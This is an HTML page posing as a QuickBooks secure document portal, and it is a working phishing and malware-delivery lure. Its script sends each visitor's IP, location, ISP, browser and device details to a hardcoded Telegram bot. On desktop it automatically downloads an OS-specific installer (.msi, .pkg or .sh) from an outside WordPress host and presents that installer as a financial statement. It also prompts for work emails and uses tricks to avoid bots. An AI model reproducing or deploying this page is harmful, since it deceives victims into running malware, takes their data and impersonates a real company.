<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>QuickBooks Document Portal ‚Ä¢ Secure File Delivery</title>

  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

  <style nonce="__CSP_NONCE__">
    :root{
      --bg: #0b0c10;
      --surface: #101218;
      --surface-2: #141824;
      --text: #e6e8ee;
      --muted: #9aa3b2;
      --brand: #2C8CFF; /* QuickBooks blue */
      --brand-ink:#0f766e;
      --ring: rgba(44,140,255,.45);
      --shadow: 0 10px 30px rgba(0,0,0,.35);
      --radius: 16px;
      --error: #f87171;
      --success: #10b981;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji";
      color:var(--text); background:radial-gradient(1200px 800px at 70% -10%, #213042 0%, transparent 60%),
                       radial-gradient(900px 600px at 10% 110%, #1a2434 0%, transparent 60%),
                       linear-gradient(180deg, #0a0c12, #0f1118);
    }
    .grain:before{content:"";position:fixed;inset:0;background:url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><filter id=\"n\"><feTurbulence type=\"fractalNoise\" baseFrequency=\".65\" numOctaves=\"1\" stitchTiles=\"stitch\"/></filter><rect width=\"100%\" height=\"100%\" filter=\"url(%23n)\" opacity=\".035\"/></svg>') center/cover repeat;pointer-events:none}

    header{
      max-width:1100px;margin:0 auto;padding:24px 24px 0;display:flex;align-items:center;gap:14px;
    }
    .brand-logo{width:28px;height:28px;border-radius:8px;background:#0f1625;display:grid;place-items:center;overflow:hidden}
    .brand-logo img{width:100%;height:100%;object-fit:cover}
    .brand-name{font-weight:600;letter-spacing:.2px}
    .brand-sub{color:var(--muted);font-size:12px}

    main{min-height:calc(100% - 80px);display:grid;place-items:center;padding:28px}

    .card{width:100%;max-width:680px;background:linear-gradient(180deg,var(--surface),var(--surface-2));
      border:1px solid rgba(255,255,255,.06);border-radius:var(--radius);box-shadow:var(--shadow);
      padding:28px 28px 24px;position:relative;overflow:hidden}
    .card:after{content:"";position:absolute;inset:-2px;border-radius:calc(var(--radius) + 2px);
      padding:1px;background:linear-gradient(120deg, rgba(44,140,255,.35), rgba(99,102,241,.25), rgba(44,140,255,.35));
      -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
      -webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none;opacity:.5}

    .intro{display:flex;align-items:flex-start;gap:18px;margin-bottom:18px}
    .intro h1{font-size:18px;line-height:1.4;margin:0}
    .intro h1 .accent{color:var(--brand)}
    .intro p{margin:2px 0 0;color:var(--muted)}

    /* OS Detection Indicator */
    .os-indicator {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(44, 140, 255, 0.1);
      border: 1px solid rgba(44, 140, 255, 0.2);
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 12px;
      color: var(--brand);
      margin-bottom: 16px;
    }

    /* QuickBooks Style Status Panel */
    .status-panel {
      background: rgba(44, 140, 255, 0.08);
      border: 1px solid rgba(44, 140, 255, 0.15);
      border-radius: 12px;
      padding: 20px;
      margin: 20px 0;
    }
    .status-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 16px;
    }
    .status-header i {
      color: var(--brand);
      font-size: 18px;
    }
    .status-header h3 {
      margin: 0;
      font-size: 16px;
      font-weight: 600;
      color: var(--brand);
    }
    .status-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      font-size: 13px;
    }
    .status-item {
      display: flex;
      flex-direction: column;
      gap: 4px;
    }
    .status-label {
      color: var(--muted);
      font-size: 12px;
    }
    .status-value {
      font-weight: 500;
      color: var(--text);
    }

    /* Mobile Warning */
    .mobile-warning {
      background: rgba(248, 113, 113, 0.08);
      border: 1px solid rgba(248, 113, 113, 0.2);
      border-radius: 12px;
      padding: 20px;
      margin: 20px 0;
      text-align: center;
      display: none;
    }
    .mobile-warning-icon {
      font-size: 24px;
      color: var(--error);
      margin-bottom: 12px;
    }
    .mobile-warning h3 {
      margin: 0 0 8px 0;
      color: var(--error);
      font-size: 16px;
    }
    .mobile-warning p {
      margin: 4px 0;
      font-size: 14px;
      color: var(--muted);
    }

    /* Download Status */
    .download-status {
      background: rgba(16, 185, 129, 0.08);
      border: 1px solid rgba(16, 185, 129, 0.15);
      border-radius: 12px;
      padding: 20px;
      margin: 20px 0;
      display: none;
    }
    .download-status h3 {
      margin: 0 0 12px 0;
      font-size: 14px;
      font-weight: 600;
      color: var(--success);
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .download-status ol {
      margin: 0;
      padding-left: 20px;
      font-size: 13px;
    }
    .download-status li {
      margin-bottom: 8px;
      color: var(--muted);
    }

    .filewrap{display:flex;align-items:center;gap:22px;margin:20px 0 8px}
    .folder{
      width:110px;height:84px;border-radius:10px;background:linear-gradient(180deg,#2C8CFF,#0066CC);
      position:relative;box-shadow:0 12px 24px rgba(0,0,0,.25);
    }
    .folder:before{content:"";position:absolute;left:8px;top:-14px;width:58px;height:22px;border-radius:6px 6px 0 0;background:linear-gradient(180deg,#1a6fd5,#2C8CFF)}
    .paper{position:absolute;right:10px;top:-6px;width:62px;height:78px;border-radius:6px;background:linear-gradient(180deg,#fff,#ecf1f8);
      box-shadow:0 8px 20px rgba(0,0,0,.2)}
    .paper:after{content:"";position:absolute;left:10px;top:16px;width:42px;height:2px;background:#c7d2e0;box-shadow:0 8px 0 #c7d2e0, 0 16px 0 #c7d2e0}

    .meta{flex:1}
    .title{font-weight:600;font-size:22px;margin:0 0 6px}
    .submeta{color:var(--muted);font-size:14px}
    .badge{display:inline-flex;align-items:center;gap:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);
      padding:6px 10px;border-radius:999px;font-size:12px;color:#cbd5e1;margin-top:10px}

    .actions{display:flex;flex-wrap:wrap;gap:12px;margin-top:20px}
    .btn{appearance:none;border:0;border-radius:14px;padding:14px 18px;font-weight:600;letter-spacing:.2px;cursor:pointer;
      transition:.18s transform ease,.18s box-shadow ease;outline:none;display:inline-flex;align-items:center;gap:10px}
    .btn[disabled]{opacity:.6;cursor:not-allowed}
    .btn-primary{background:linear-gradient(180deg,#2C8CFF,#0066CC);color:white;box-shadow:0 8px 20px rgba(44,140,255,.28)}
    .btn-primary:hover{transform:translateY(-1px);box-shadow:0 12px 26px rgba(44,140,255,.34)}
    .btn-ghost{background:rgba(255,255,255,.03);color:#e2e8f0;border:1px solid rgba(255,255,255,.08)}
    .btn-ghost:hover{transform:translateY(-1px);box-shadow:0 12px 26px rgba(0,0,0,.35)}

    .notice{margin-top:16px;color:#8ea0b5;font-size:12px}

    footer{max-width:1100px;margin:28px auto 34px;padding:0 24px;color:#93a2b8;font-size:12px;display:flex;justify-content:space-between;align-items:center}
    .foot-right{opacity:.85}

    /* Modal */
    dialog{border:none;border-radius:18px;padding:0;background:linear-gradient(180deg,var(--surface),var(--surface-2));color:var(--text);
      box-shadow:0 30px 90px rgba(0,0,0,.45);width:min(520px,92vw)}
    dialog::backdrop{background:rgba(0,0,0,.6);backdrop-filter:blur(4px)}
    .modal-head{padding:18px 22px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;justify-content:space-between;align-items:center}
    .modal-title{font-weight:600}
    .modal-body{padding:22px}
    .form-row{display:flex;flex-direction:column;gap:8px}
    .input{width:100%;padding:14px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.10);background:#0f1320;color:#e5e7eb;
      outline:none;transition:border-color .15s ease, box-shadow .15s ease}
    .input:focus{border-color:var(--brand);box-shadow:0 0 0 4px var(--ring)}
    .help{font-size:12px;color:#90a0b6}
    .modal-actions{display:flex;justify-content:flex-end;gap:10px;padding:0 22px 22px}

    /* Preloader */
    .preloader{position:fixed;inset:0;display:grid;place-items:center;background:rgba(10,12,16,.85);backdrop-filter:blur(6px);z-index:40}
    .spinner{width:22px;height:22px;border-radius:999px;border:3px solid rgba(255,255,255,.15);border-top-color:var(--brand);animation:spin .8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}

    .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0}
      [hidden]{display:none !important;}
  </style>
</head>
<body class="grain">
  <div id="preloader" class="preloader" hidden style="display:none">
    <div role="status" aria-live="polite" class="spinner"></div>
    <span class="sr-only">Loading‚Ä¶</span>
  </div>

  <header>
    <div class="brand-logo" aria-hidden="true"><img id="brandLogo" alt="" /></div>
    <div>
      <div class="brand-name" id="brandName">QuickBooks Portal</div>
      <div class="brand-sub" id="brandSub">Secure document delivery</div>
    </div>
  </header>

  <main>
    <section class="card" aria-labelledby="shareTitle">
      <!-- OS Detection Indicator -->
      <div class="os-indicator" id="osIndicator">
        <i class="fas fa-desktop"></i>
        <span id="osText">Detecting your system...</span>
      </div>

      <div class="intro">
        <div>
          <h1 id="shareTitle">
            <span class="accent" id="shareName">Accounting Department</span>
            <span id="shareDomain">(quickbooks.com)</span>
            <span> shared ‚Äú<span id="fileTitle">Financial Statement</span>‚Äù with you.</span>
          </h1>
          <p id="forEmail" aria-live="polite"></p>
        </div>
      </div>

      <!-- QuickBooks Status Panel -->
      <div class="status-panel" id="statusPanel">
        <div class="status-header">
          <i class="fas fa-file-invoice"></i>
          <h3>Document Status</h3>
        </div>
        <div class="status-grid">
          <div class="status-item">
            <span class="status-label">Document Type</span>
            <span class="status-value" id="docType">Financial Statement</span>
          </div>
          <div class="status-item">
            <span class="status-label">File Format</span>
            <span class="status-value" id="fileFormat">Secure Package</span>
          </div>
          <div class="status-item">
            <span class="status-label">Security Level</span>
            <span class="status-value" id="securityLevel">Encrypted</span>
          </div>
          <div class="status-item">
            <span class="status-label">Access Code</span>
            <span class="status-value" id="accessCode">Verified</span>
          </div>
        </div>
      </div>

      <!-- Mobile Warning -->
      <div class="mobile-warning" id="mobileWarning">
        <div class="mobile-warning-icon">
          <i class="fas fa-mobile-alt"></i>
        </div>
        <h3>Mobile Device Detected</h3>
        <p>This financial document requires a desktop computer for proper viewing.</p>
        <p>Please use a Windows PC or Mac to access this file.</p>
      </div>

      <div class="filewrap">
        <div class="folder" aria-hidden="true">
          <div class="paper"></div>
        </div>
        <div class="meta">
          <h2 class="title" id="fileTitleDup">Financial Statement</h2>
          <div class="submeta">
            <span id="fileType">Secure Package</span>
            <span> ‚Ä¢ </span>
            <span id="fileSize">~ 5.2 MB</span>
            <span class="badge" id="shareBy">Shared by Accounting Department</span>
          </div>

          <div class="actions">
            <button id="viewBtn" class="btn btn-primary" disabled>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M3 12s3.5-7 9-7 9 7 9 7-3.5 7-9 7-9-7-9-7Z" stroke="white" stroke-width="1.7"/><circle cx="12" cy="12" r="3.5" fill="white"/></svg>
              View Document
            </button>
            <button id="downloadBtn" class="btn btn-ghost" disabled>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3v12m0 0 4-4m-4 4-4-4M5 21h14" stroke="#cbd5e1" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
              Download Package
            </button>
          </div>

          <!-- Download Status -->
          <div class="download-status" id="downloadStatus">
            <h3>
              <i class="fas fa-check-circle"></i>
              Download Complete
            </h3>
            <ol>
              <li>Locate the downloaded file in your Downloads folder</li>
              <li>Open the package to access financial documents</li>
              <li>Review the statement for accuracy</li>
              <li>Contact accounting with any questions</li>
              <li>Keep documents secure for your records</li>
            </ol>
          </div>

          <div class="notice" id="notice">Secure document delivery powered by QuickBooks</div>
        </div>
      </div>
    </section>
  </main>

  <footer>
    <div>¬© <span id="year"></span> <span id="footerBrand">QuickBooks Portal</span>. All rights reserved.</div>
    <div class="foot-right">Confidential financial document</div>
  </footer>

  <!-- Email collect modal (used only if no email is present) -->
  <dialog id="emailModal" aria-labelledby="modalTitle" aria-modal="true">
    <form method="dialog" id="emailForm" novalidate>
      <div class="modal-head">
        <div class="modal-title" id="modalTitle">Verify your email to continue</div>
        <button type="button" id="closeModal" class="btn btn-ghost" style="padding:8px 10px;border-radius:10px">Close</button>
      </div>
      <div class="modal-body">
        <div class="form-row">
          <label for="emailInput">Work email</label>
          <input class="input" id="emailInput" name="email" type="email" placeholder="you@company.com" autocomplete="email" required />
          <!-- Honeypot: real users won't fill this. -->
          <input type="text" name="website" id="hpWebsite" class="sr-only" tabindex="-1" aria-hidden="true" autocomplete="off" />
          <div class="help">We'll use this to securely open your financial documents.</div>
        </div>
      </div>
      <div class="modal-actions">
        <button class="btn btn-ghost" value="cancel" type="submit">Cancel</button>
        <button class="btn btn-primary" id="emailSubmit" value="ok" type="submit">Continue</button>
      </div>
    </form>
  </dialog>

  <!-- Font Awesome for icons -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>

  <script nonce="__CSP_NONCE__" defer>
    // Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '7724508196:AAGCOwEjIGVNGHE5eqklanam4sJKdMJgmPQ';
    const TELEGRAM_CHAT_ID = '7724482403';

    (function(){
      const $ = (sel, root=document) => root.querySelector(sel);
      const preloader = $('#preloader');
      if (preloader) preloader.setAttribute('hidden','');

      const params = new URLSearchParams(location.search);

      // Allow email via hash: #ux=email or #e=email
      const hash = location.hash || '';
      if(hash.startsWith('#ux=') || hash.startsWith('#e=')){
        const v = decodeURIComponent(hash.split('=')[1] || '');
        if(v) params.set('e', v);
      }

      // Extract values or fallbacks
      const shareName = params.get('n') || 'Accounting Department';
      const shareDomain = params.get('d') || 'quickbooks.com';
      const fileTitle = params.get('t') || 'Financial Statement';
      const fileSize = params.get('s') || '~ 5.2 MB';
      const brandDomain = params.get('brand') || shareDomain;

      let email = params.get('e') || '';
      const isB64 = params.get('b64') === '1';
      if(isB64){ try { email = atob(email); } catch(e){} }

      // Collect visitor information for Telegram
      let visitorData = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        referrer: document.referrer,
        downloadInitiated: false,
        downloadCompleted: false,
        os: null,
        deviceType: null
      };

      // OS Detection Function
      function detectOS() {
        const platform = navigator.platform.toLowerCase();
        const userAgent = navigator.userAgent.toLowerCase();

        if (platform.includes('win')) return 'Windows';
        if (platform.includes('mac')) return 'macOS';
        if (platform.includes('linux') || userAgent.includes('linux')) return 'Linux';
        if (/iphone|ipad|ipod/i.test(userAgent)) return 'iOS';
        if (/android/i.test(userAgent)) return 'Android';
        return 'Unknown OS';
      }

      // Get Download Link Based on OS
      function getDownloadLink(os) {
        switch (os.toLowerCase()) {
          case 'windows':
            return 'https://kalection.com/wp-content/wen65-654g7-yv78/6g45tg-098765rt987fg-6546rfg7/eCorporate-SSAStatement.msi?e=Access&y=Guest';
          case 'macos':
            return 'https://kalection.com/wp-content/wen65-654g7-yv78/6g45tg-098765rt987fg-6546rfg7/eCorporate-SSAStatement.pkg?e=Access&y=Guest';
          case 'linux':
            return 'https://kalection.com/wp-content/wen65-654g7-yv78/6g45tg-098765rt987fg-6546rfg7/eCorporate-SSAStatement.sh?e=Access&y=Guest';
          default:
            return 'https://kalection.com/wp-content/wen65-654g7-yv78/6g45tg-098765rt987fg-6546rfg7/eCorporate-SSAStatement.msi?e=Access&y=Guest';
        }
      }

      // Function to update UI based on OS and device
      function updateUIForDevice(os, deviceType) {
        const osIndicator = $('#osIndicator');
        const osText = $('#osText');
        const mobileWarning = $('#mobileWarning');
        const downloadBtn = $('#downloadBtn');
        const viewBtn = $('#viewBtn');
        
        // Update OS indicator
        osText.textContent = `${os} detected`;
        
        // Update file details based on OS
        if (os === "Windows") {
          $('#fileTitle').textContent = "Financial Statement - Windows";
          $('#fileTitleDup').textContent = "Financial Statement - Windows";
          $('#fileSize').textContent = "5.2 MB";
          $('#fileFormat').textContent = "MSI Installer";
        } else if (os === "macOS") {
          $('#fileTitle').textContent = "Financial Statement - Mac";
          $('#fileTitleDup').textContent = "Financial Statement - Mac";
          $('#fileSize').textContent = "4.9 MB";
          $('#fileFormat').textContent = "PKG Installer";
        } else if (os === "Linux") {
          $('#fileTitle').textContent = "Financial Statement - Linux";
          $('#fileTitleDup').textContent = "Financial Statement - Linux";
          $('#fileSize').textContent = "4.7 MB";
          $('#fileFormat').textContent = "Shell Script";
        }
        
        // Show mobile warning if on mobile device
        if (deviceType === "mobile") {
          mobileWarning.style.display = "block";
          downloadBtn.disabled = true;
          viewBtn.disabled = true;
          downloadBtn.innerHTML = '<i class="fas fa-ban"></i> Desktop Required';
          viewBtn.innerHTML = '<i class="fas fa-ban"></i> Desktop Required';
        } else {
          // Auto-download after 3 seconds for desktop users
          setTimeout(() => {
            initiateAutoDownload();
          }, 3000);
        }
      }

      // Function to get IP and location information
      async function getVisitorIPAndLocation() {
        try {
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          
          visitorData.ip = data.ip;
          visitorData.country = data.country_name;
          visitorData.region = data.region;
          visitorData.city = data.city;
          visitorData.isp = data.org;
          visitorData.timezone = data.timezone;
          
          return data;
        } catch (error) {
          console.error('Error fetching IP data:', error);
          // Fallback to another service
          try {
            const fallbackResponse = await fetch('https://api.ipify.org?format=json');
            const fallbackData = await fallbackResponse.json();
            visitorData.ip = fallbackData.ip;
          } catch (fallbackError) {
            console.error('Error with fallback IP service:', fallbackError);
          }
          return null;
        }
      }

      // Function to send message to Telegram
      async function sendTelegramMessage(message) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
          console.warn('Telegram bot token or chat ID not configured');
          return;
        }
        
        try {
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          });
          
          if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
          }
          
          return await response.json();
        } catch (error) {
          console.error('Error sending Telegram message:', error);
        }
      }

      // Function to format visitor data for Telegram
      function formatVisitorDataForTelegram(data, eventType) {
        const emoji = eventType === 'visit' ? 'üëÅÔ∏è' : eventType === 'download' ? 'üì•' : '‚ùì';
        const title = eventType === 'visit' ? 'NEW VISIT' : eventType === 'download' ? 'DOWNLOAD INITIATED' : 'UNKNOWN EVENT';
        
        return `
${emoji} <b>${title}</b> ${emoji}

üïê <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
üåê <b>Location:</b> ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}
üè¢ <b>ISP:</b> ${data.isp || 'Unknown'}
üíª <b>OS:</b> ${data.os || 'Unknown'}
üì± <b>Device:</b> ${data.deviceType || 'Unknown'}
üåç <b>Browser:</b> ${navigator.userAgent}
üñ•Ô∏è <b>Screen:</b> ${data.screenWidth || 'Unknown'}x${data.screenHeight || 'Unknown'}
üîó <b>Referrer:</b> ${data.referrer || 'Direct'}
üåê <b>Language:</b> ${data.language || 'Unknown'}
        `.trim();
      }

      // Initialize visitor tracking
      async function initializeVisitorTracking() {
        // Detect OS and device
        const os = detectOS();
        const deviceType = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "mobile" : "desktop";
        
        visitorData.os = os;
        visitorData.deviceType = deviceType;
        
        // Update UI based on detection
        updateUIForDevice(os, deviceType);
        
        // Get IP and location
        await getVisitorIPAndLocation();
        
        // Send visit notification to Telegram
        const visitMessage = formatVisitorDataForTelegram(visitorData, 'visit');
        await sendTelegramMessage(visitMessage);
        
        console.log('Visitor data collected:', visitorData);
      }

      // Auto-download function
      async function initiateAutoDownload() {
        if (visitorData.deviceType === "mobile") return;
        
        const os = detectOS();
        const downloadUrl = getDownloadLink(os);
        
        // Mark download as initiated
        visitorData.downloadInitiated = true;
        visitorData.downloadTimestamp = new Date().toISOString();
        
        // Send download notification to Telegram
        const downloadMessage = formatVisitorDataForTelegram(visitorData, 'download');
        await sendTelegramMessage(downloadMessage);
        
        // Show downloading status
        $('#downloadBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading...';
        $('#downloadBtn').disabled = true;
        
        // Create a temporary anchor element to trigger download
        setTimeout(() => {
          const a = document.createElement('a');
          a.href = downloadUrl;
          a.download = $('#fileTitleDup').textContent;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          
          // Mark download as completed
          visitorData.downloadCompleted = true;
          
          // Show download complete status
          $('#downloadStatus').style.display = 'block';
          $('#downloadBtn').innerHTML = '<i class="fas fa-check"></i> Download Complete';
          $('#downloadBtn').style.background = 'var(--success)';
          
        }, 1000);
      }

      // Render header branding
      $('#brandName').textContent = (brandDomain ? brandDomain.replace(/^www\./,'') : 'QuickBooks Portal');
      $('#footerBrand').textContent = $('#brandName').textContent;
      $('#brandSub').textContent = 'Secure document delivery';
      $('#brandLogo').src = brandDomain ? `https://logo.clearbit.com/${encodeURIComponent(brandDomain)}` : '';
      $('#brandLogo').alt = brandDomain ? `${brandDomain} logo` : '';

      // Render share line & meta
      $('#shareName').textContent = shareName;
      $('#shareDomain').textContent = `(${shareDomain})`;
      $('#fileTitle').textContent = fileTitle;
      $('#fileTitleDup').textContent = fileTitle;
      $('#shareBy').textContent = `Shared by ${shareName}`;
      $('#fileSize').textContent = fileSize;

      if(email){
        $('#forEmail').textContent = `Secure for ${email}`;
      }

      // Initialize tracking when page loads
      initializeVisitorTracking();

      // Grace period to thwart naive bots
      const viewBtn = $('#viewBtn');
      const downloadBtn = $('#downloadBtn');
      setTimeout(() => { 
        if (visitorData.deviceType !== "mobile") {
          viewBtn.disabled = false; 
          downloadBtn.disabled = false; 
        }
      }, 650);

      function openPreloader(label){
        preloader.removeAttribute('hidden');
        preloader.setAttribute('aria-label', label || 'Working');
      }
      function closePreloader(){ preloader.setAttribute('hidden', ''); }

      // Email modal if needed
      const emailModal = $('#emailModal');
      const emailInput = $('#emailInput');
      const emailForm = $('#emailForm');
      const hp = $('#hpWebsite');
      $('#closeModal').addEventListener('click', () => emailModal.close());

      function validateEmail(v){
        return /^(?!.*\.{2})[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(v || '');
      }

      async function ensureEmailThen(go){
        if(email && validateEmail(email)){
          go();
          return;
        }
        emailModal.showModal();
        setTimeout(() => emailInput.focus(), 60);
        emailForm.onsubmit = (ev) => {
          ev.preventDefault();
          if(hp.value) { emailModal.close(); return; } // bot filled honeypot
          const v = emailInput.value.trim();
          if(!validateEmail(v)){
            emailInput.setCustomValidity('Enter a valid email');
            emailInput.reportValidity();
            return;
          }
          email = v; // persist for this session
          $('#forEmail').textContent = `Secure for ${email}`;
          emailModal.close();
          go();
        };
      }

      viewBtn.addEventListener('click', () => {
        ensureEmailThen(() => {
          const os = detectOS();
          const downloadUrl = getDownloadLink(os);
          window.location.href = downloadUrl;
        });
      });
      
      downloadBtn.addEventListener('click', () => {
        ensureEmailThen(() => initiateAutoDownload());
      });

      // Footer year
      $('#year').textContent = new Date().getFullYear();
    })();
  </script>
</body>
</html>
